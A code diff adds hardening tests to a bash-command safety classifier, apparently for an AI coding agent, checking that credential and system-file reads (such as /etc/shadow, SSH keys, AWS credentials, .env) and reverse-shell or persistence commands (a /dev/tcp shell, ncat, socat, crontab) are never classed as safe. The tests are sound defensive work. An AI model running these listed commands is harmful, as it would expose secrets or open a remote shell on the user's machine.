@@ -40,3 +40,21 @@ describe("classifyBashSafety", () => {
     expect(classifyBashSafety("find . -exec rm {} +")).toBe("unknown");
   });
 });
+
+describe("classifyBashSafety — sensitive targets + reverse-shell vectors (hardening)", () => {
+  it("never classifies a credential/system-path read as safe", () => {
+    for (const c of ["cat /etc/shadow", "cat /etc/passwd", "find . -name id_rsa", "cat ~/.ssh/config", "grep key ~/.aws/credentials", "cat .env", "cat ~/.codex/auth.json", "find / -name google-tokens.json"]) {
+      expect(classifyBashSafety(c), c).toBe("unknown");
+    }
+  });
+  it("treats reverse-shell / persistence vectors as unknown", () => {
+    for (const c of ["ncat host 4444", "socat - tcp:host:4444", "telnet host 23", "bash -i >& /dev/tcp/host/4444", "crontab payload"]) {
+      expect(classifyBashSafety(c), c).toBe("unknown");
+    }
+  });
+  it("still allows genuinely-safe in-project reads", () => {
+    for (const c of ["cat README.md", "grep foo src/index.ts", "find src -name '*.ts'", "git status"]) {
+      expect(classifyBashSafety(c), c).toBe("safe");
+    }
+  });
+});
